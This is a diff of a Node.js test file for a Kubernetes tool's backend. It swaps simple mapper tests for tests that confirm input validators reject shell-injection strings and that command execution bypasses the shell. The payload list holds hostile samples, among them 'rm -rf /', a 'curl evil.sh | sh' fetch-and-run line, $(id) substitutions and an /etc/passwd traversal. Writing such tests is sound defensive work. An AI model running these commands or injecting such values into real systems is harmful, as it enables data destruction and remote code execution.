@@ -1,36 +1,87 @@
 const test = require('node:test');
 const assert = require('node:assert');
 
-test('Backend - Kubescape severity mapper helper test', (t) => {
-    const mapSeverity = (severity) => {
-        if (severity === 'Critical') return 'Critical';
-        if (severity === 'High') return 'Error';
-        if (severity === 'Medium') return 'Warning';
-        if (severity === 'Low') return 'Info';
-        return 'Warning';
-    };
+// These tests exercise the ACTUAL exported source modules (not inline copies),
+// so they fail if the real validation or command-execution behavior regresses.
+const validators = require('./src/utils/validators');
+const { run } = require('./src/utils/exec');
 
-    assert.strictEqual(mapSeverity('Critical'), 'Critical');
-    assert.strictEqual(mapSeverity('High'), 'Error');
-    assert.strictEqual(mapSeverity('Medium'), 'Warning');
-    assert.strictEqual(mapSeverity('Low'), 'Info');
-    assert.strictEqual(mapSeverity('Unknown'), 'Warning');
+// Classic shell-injection payloads that must never be accepted as a Kubernetes
+// identifier and must never be interpreted by a shell.
+const INJECTION_PAYLOADS = [
+    'default; rm -rf /',
+    'default && curl evil.sh | sh',
+    'name`id`',
+    'name$(id)',
+    'a|b',
+    'a&b',
+    'a>b',
+    "a' OR '1'='1",
+    'a\nb',
+    '../../etc/passwd',
+    '$(touch /tmp/pwned)',
+];
+
+test('validators - accepts legitimate namespaces', () => {
+    assert.ok(validators.isValidNamespace('default'));
+    assert.ok(validators.isValidNamespace('kube-system'));
+    assert.ok(validators.isValidNamespace('periscope'));
 });
 
-test('Backend - Compliance score grade mapper test', (t) => {
-    const getGrade = (score) => {
-        if (score >= 95) return 'A+';
-        if (score >= 90) return 'A';
-        if (score >= 80) return 'B';
-        if (score >= 70) return 'C';
-        if (score >= 60) return 'D';
-        return 'F';
-    };
+test('validators - accepts legitimate resource names and kinds', () => {
+    assert.ok(validators.isValidName('my-pod-7d6f54c9-abc12'));
+    assert.ok(validators.isValidName('release.v2'));
+    assert.ok(validators.isValidKind('deployments'));
+    assert.ok(validators.isValidKind('foos.example.com')); // CRD
+});
 
-    assert.strictEqual(getGrade(97), 'A+');
-    assert.strictEqual(getGrade(92), 'A');
-    assert.strictEqual(getGrade(85), 'B');
-    assert.strictEqual(getGrade(72), 'C');
-    assert.strictEqual(getGrade(64), 'D');
-    assert.strictEqual(getGrade(45), 'F');
+test('validators - "all" sentinel is a valid namespace selector', () => {
+    assert.ok(validators.isValidNamespaceOrAll('all'));
+    assert.ok(validators.isValidNamespaceOrAll('default'));
+    assert.ok(!validators.isValidNamespaceOrAll('all; rm -rf /'));
+});
+
+test('validators - rejects uppercase and over-length identifiers', () => {
+    assert.ok(!validators.isValidNamespace('Default'));
+    assert.ok(!validators.isValidNamespace('a'.repeat(64)));
+    assert.ok(!validators.isValidName('a'.repeat(254)));
+});
+
+test('validators - rejects every injection payload for namespace/name/kind', () => {
+    for (const payload of INJECTION_PAYLOADS) {
+        assert.ok(!validators.isValidNamespace(payload), `namespace accepted: ${payload}`);
+        assert.ok(!validators.isValidName(payload), `name accepted: ${payload}`);
+        assert.ok(!validators.isValidKind(payload), `kind accepted: ${payload}`);
+    }
+});
+
+test('validators - assert* throws ValidationError (HTTP 400) on injection', () => {
+    for (const payload of INJECTION_PAYLOADS) {
+        assert.throws(() => validators.assertNamespace(payload), (e) => {
+            return e instanceof validators.ValidationError && e.statusCode === 400;
+        });
+        assert.throws(() => validators.assertName(payload), validators.ValidationError);
+    }
+});
+
+test('validators - assert* returns the value when valid', () => {
+    assert.strictEqual(validators.assertNamespace('default'), 'default');
+    assert.strictEqual(validators.assertName('my-pod'), 'my-pod');
+    assert.strictEqual(validators.assertKind('deployments'), 'deployments');
+});
+
+test('exec.run - executes without a shell, so metacharacters stay literal', async () => {
+    // With a shell, `echo $(id)` would run `id`. Via execFile (no shell), echo
+    // receives the literal string. This is the core anti-injection guarantee.
+    const { stdout } = await run('echo', ['$(id)']);
+    assert.strictEqual(stdout.trim(), '$(id)');
+
+    const { stdout: out2 } = await run('echo', ['a; rm -rf /', 'b`whoami`']);
+    assert.strictEqual(out2.trim(), 'a; rm -rf / b`whoami`');
+});
+
+test('exec.run - rejects on non-zero exit and surfaces stderr', async () => {
+    await assert.rejects(run('sh', ['-c', 'echo boom 1>&2; exit 3']), (err) => {
+        return err.stderr.includes('boom');
+    });
 });
